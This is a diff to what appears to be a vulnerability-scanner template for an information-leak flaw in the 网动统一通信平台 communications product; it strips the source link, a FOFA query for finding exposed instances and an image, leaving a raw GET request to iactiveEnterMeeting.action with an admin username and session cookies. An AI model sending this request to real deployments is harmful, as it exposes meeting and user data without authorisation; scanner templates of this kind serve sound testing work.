@@ -3,12 +3,8 @@ info:
   name: 网动统一通信平台iactiveEnterMeeting存在信息泄露漏洞
   author: hacktwo
   severity: medium
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/da217laycohnenma'
+  description: ''
   tags: info-leak,2024
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: da217laycohnenma
-    fofa: body="网动统一通信平台" || title="网动统一通信平台"
 http:
 - raw:
   - 'GET /acenter/iactiveEnterMeeting.action?roomid=1&username=admin HTTP/1.1
@@ -27,10 +23,7 @@ http:
 
     Cookie: JSESSIONID=E67E1B686F7637D8C05485CC91025CA8; JSESSIONID=7AC13A64641122A1927F44838A215C56
 
-    Connection: close
-
-
-    ![](https://cdn.nlark.com/yuque/0/2024/png/43110909/1730077468582-49dff289-b8d2-4ada-b5b2-e1eac63a2d24.png)'
+    Connection: close'
   redirects: false
   matchers:
   - status:
